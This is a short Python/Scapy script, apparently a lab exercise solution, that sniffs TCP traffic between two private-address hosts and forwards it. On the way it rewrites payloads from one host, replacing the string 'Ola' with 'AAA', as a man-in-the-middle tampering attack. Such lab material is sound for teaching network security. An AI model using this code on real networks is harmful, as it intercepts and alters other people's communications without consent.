#!/usr/bin/env python3

from scapy.all import *

IP_A = "10.9.0.5"
IP_B = "10.9.0.6"

def spoof_pkt(pkt):

    if IP in pkt and TCP in pkt:

        # From A to B
        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:

            newpkt = IP(bytes(pkt[IP]))

            del(newpkt.chksum)
            del(newpkt[TCP].payload)
            del(newpkt[TCP].chksum)

            if pkt[TCP].payload:
                data = pkt[TCP].payload.load

                text = data.decode(errors="ignore")
                text = text.replace("Ola", "AAA")
                newdata = text.encode()
                send(newpkt/newdata, verbose=False)
            else:
                send(newpkt, verbose=False)

        # From B to A
        elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:

            newpkt = IP(bytes(pkt[IP]))

            del(newpkt.chksum)
            del(newpkt[TCP].chksum)

            send(newpkt, verbose=False)

sniff(
    iface="eth0",
    filter="tcp",
    prn=spoof_pkt
)
